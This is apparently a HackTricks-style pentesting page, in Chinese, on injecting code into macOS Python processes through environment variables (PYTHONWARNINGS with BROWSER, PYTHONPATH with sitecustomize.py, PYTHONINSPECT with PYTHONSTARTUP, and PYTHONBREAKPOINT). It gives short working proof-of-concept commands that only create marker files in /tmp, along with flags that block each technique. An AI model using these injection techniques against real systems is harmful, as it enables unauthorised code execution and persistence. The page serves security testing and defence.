# macOS Python 应用程序注入

{{#include ../../../banners/hacktricks-training.md}}

## 通过 `PYTHONWARNINGS` 和 `BROWSER` 环境变量

如果攻击者能够控制 Python 进程的环境变量，那么在处理精心构造的 warning 选项时，`PYTHONWARNINGS` 和 `BROWSER` 的组合可能会在 Python 导入 `antigravity` 模块时触发命令执行。此技术利用 `antigravity` 通过 Python 的 `webbrowser` 模块打开 URL，而该模块会读取 `BROWSER` 环境变量。<sup>[[1]](#references)</sup>

```bash
# Generate an example Python script.
echo "print('hi')" > /tmp/script.py

# Create /tmp/hacktricks through the inherited environment.
PYTHONWARNINGS="all:0:antigravity.x:0:0" BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 /tmp/script.py

# With isolated mode, inject the warning rule using -W instead.
BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 -I -W all:0:antigravity.x:0:0 /tmp/script.py
```

## 通过 `PYTHONPATH` 和 `sitecustomize.py`

正常启动时，Python 的 `site` 模块会添加特定于站点的路径，然后尝试导入名为 `sitecustomize` 的模块。攻击者可将其可读目录放在 `PYTHONPATH` 的首位；如果攻击者控制进程环境，就能让 Python 在目标脚本之前导入 payload。`-S` 标志会禁用自动 `site` 初始化，而隔离模式（`-I`）会忽略 `PYTHONPATH`，并隐含启用 `-s` 和 `-E`。<sup>[[2]](#references)[[3]](#references)</sup>

```bash
mkdir -p /tmp/python-startup
cat >/tmp/python-startup/sitecustomize.py <<'EOF'
from pathlib import Path
Path('/tmp/python-sitecustomize-executed').touch()
EOF

PYTHONPATH=/tmp/python-startup python3 /tmp/script.py
```

若要通过可写的用户 site 实现持久化，而非使用继承的 `PYTHONPATH`，请参阅 [Python `.pth`、`.start` 和 `usercustomize` 启动文件](../../macos-auto-start-locations.md#python-startup-files-pth--usercustomize--sitecustomize)。

## 通过 `PYTHONINSPECT` 和 `PYTHONSTARTUP` 在脚本运行后触发

在 CPython 3.13+ 中，使用 `PYTHONINSPECT=1` 启动的脚本结束后会进入交互会话。如果标准输入是终端且 PyREPL 可用，该会话会在目标脚本运行**之后**、显示提示符之前执行 `PYTHONSTARTUP` 指定的文件。因此，能够控制这两个继承变量以及一个可读启动文件的攻击者，无需修改目标进程的脚本即可在其中运行代码。这是脚本运行后的触发机制，而非普通的启动钩子。<sup>[[3]](#references)[[5]](#references)[[6]](#references)</sup>

```bash
cat >/tmp/python-post.py <<'EOF'
from pathlib import Path
Path('/tmp/python-post-executed').touch()
EOF

# Run from a terminal using CPython 3.13+; exit the resulting prompt with Ctrl-D.
PYTHONINSPECT=1 PYTHONSTARTUP=/tmp/python-post.py python3.13 /tmp/script.py
```

该链在较旧的 CPython 版本、标准输入不是终端时，或 `PYTHON_BASIC_REPL` 强制使用基本 REPL 时，不会执行启动文件。`-E` 和 `-I` 会忽略 `PYTHON*` 环境变量。依赖此路径前，请检查实际使用的解释器和终端环境。<sup>[[3]](#references)[[5]](#references)</sup>

## 通过 `PYTHONBREAKPOINT`

从 Python 3.7（PEP 553）开始，内置的 `breakpoint()` 会导入并调用 `sys.breakpointhook` 指向的目标，而该目标由 **`PYTHONBREAKPOINT`** 环境变量指定（`package.module.callable`）。导入指定模块和调用该 callable 都会在调试器通常出现之前运行，因此，若攻击者能够控制某个会执行 `breakpoint()` 的进程的环境变量（这类调用常见于维护/调试脚本，有时也会遗留在生产环境的代码路径中），就能实现代码执行。<sup>[[4]](#references)</sup>

```bash
cat >/tmp/bp.py <<'EOF'
import sys
print("before")
breakpoint(*sys.argv[1:])
EOF

# breakpoint() invokes the chosen callable with its arguments
PYTHONBREAKPOINT="os.system" python3 /tmp/bp.py "touch /tmp/py-bp-executed"
ls -la /tmp/py-bp-executed
```

与 `PYTHONWARNINGS`/`PYTHONPATH` 不同，这要求目标进程实际执行到 `breakpoint()` 调用；但它也可以仅通过指定模块的 **import 副作用**发挥作用（可以指向任意可导入的模块，例如放在 `PYTHONPATH` 首位的模块，只要其顶层代码会运行）。设置 `PYTHONBREAKPOINT=0` 可完全禁用该钩子。



## References

- [1] [使用环境变量进行 Hacking - elttam](https://www.elttam.com/blog/env/)
- [2] [site — 站点特定配置钩子](https://docs.python.org/3/library/site.html)
- [3] [Python 命令行与环境](https://docs.python.org/3/using/cmdline.html)
- [4] [PEP 553 — 内置的 breakpoint() 与 PYTHONBREAKPOINT](https://peps.python.org/pep-0553/)
- [5] [CPython 解释器 REPL 分发（`Modules/main.c`）](https://github.com/python/cpython/blob/v3.15.2/Modules/main.c)
- [6] [CPython PyREPL 启动文件执行（`Lib/_pyrepl/main.py`）](https://github.com/python/cpython/blob/v3.15.2/Lib/_pyrepl/main.py)
{{#include ../../../banners/hacktricks-training.md}}
